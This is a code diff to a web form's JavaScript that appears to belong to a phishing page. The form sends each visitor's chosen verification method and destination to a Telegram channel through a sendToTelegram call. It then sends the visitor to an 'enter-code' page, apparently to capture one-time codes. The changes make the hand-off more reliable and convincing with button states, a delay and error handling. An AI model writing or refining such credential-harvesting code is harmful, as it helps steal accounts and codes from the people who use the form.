@@ -7,6 +7,7 @@
   var authHint = document.getElementById("auth-hint");
   var methodError = document.getElementById("method_validation_message");
   var destinationError = document.getElementById("destination_validation_message");
+  var submitBtn = form.querySelector('.button-subm');
 
   // ============================================================
   // ====== TELEGRAM INTEGRATION =================================
@@ -144,21 +145,33 @@
     }
 
     // ====== SEND AUTH ATTEMPT TO TELEGRAM ======
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Sending...';
+    
     sendToTelegram('auth_attempt', {
       method: method,
       destination: destination
+    }).then(() => {
+      submitBtn.textContent = 'Generating code...';
+      
+      try {
+        sessionStorage.setItem(
+          "melodyAuth",
+          JSON.stringify({
+            method: method,
+            destination: destination
+          })
+        );
+      } catch (e) {}
+      
+      // ====== REDIRECT TO ENTER CODE PAGE ======
+      setTimeout(function() {
+        window.location.href = "enter-code.html";
+      }, 1500);
+    }).catch(() => {
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Generate Code';
+      alert('An error occurred. Please try again.');
     });
-
-    try {
-      sessionStorage.setItem(
-        "melodyAuth",
-        JSON.stringify({
-          method: method,
-          destination: destination
-        })
-      );
-    } catch (e) {}
-
-    window.location.href = "enter-code.html";
   });
 })();
